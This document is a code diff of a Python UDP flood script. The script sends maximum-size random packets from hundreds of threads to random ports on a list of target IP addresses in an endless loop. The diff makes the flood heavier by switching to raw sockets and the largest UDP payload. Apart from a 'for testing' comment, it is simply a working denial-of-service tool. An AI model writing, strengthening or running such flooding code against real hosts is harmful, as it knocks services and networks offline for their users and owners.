@@ -4,24 +4,23 @@ import socket
 import random
 
 # Configuration parameters
-NUM_THREADS = 100000000  # Increased number of threads
-NUM_REQUESTS = 10000000000000  # Increased number of requests per thread
-DURATION = 1  # Duration in seconds
+NUM_THREADS = 500  # Increased number of threads
+DURATION = 600  # Duration in seconds
 
 # List of target IP addresses for testing
 targets = [
     "192.168.1.1", "192.168.1.2", "192.168.1.3",  # Replace with appropriate IPs
 ]
 
-# Random data to send in UDP packets
-data = random._urandom(1024)
+# Random data to send in raw packets
+data = random._urandom(65507)  # Maximum size for a UDP packet
 
 def flood():
     while True:
         try:
             target_ip = random.choice(targets)
             target_port = random.randint(1, 65535)
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
             sock.sendto(data, (target_ip, target_port))
         except Exception as e:
             print(f"Error: {e}")
